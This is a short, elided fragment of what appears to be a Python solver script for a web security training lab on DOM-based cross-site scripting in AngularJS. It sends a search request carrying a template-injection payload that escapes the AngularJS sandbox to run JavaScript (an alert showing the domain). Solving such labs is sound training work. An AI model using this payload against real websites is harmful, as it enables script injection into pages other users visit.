...
def main():
    print('[+] Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded')
    try:
    ...
    url = host + "/?search={{constructor.constructor('alert(document.domain)')()}}"
    client.get(url)
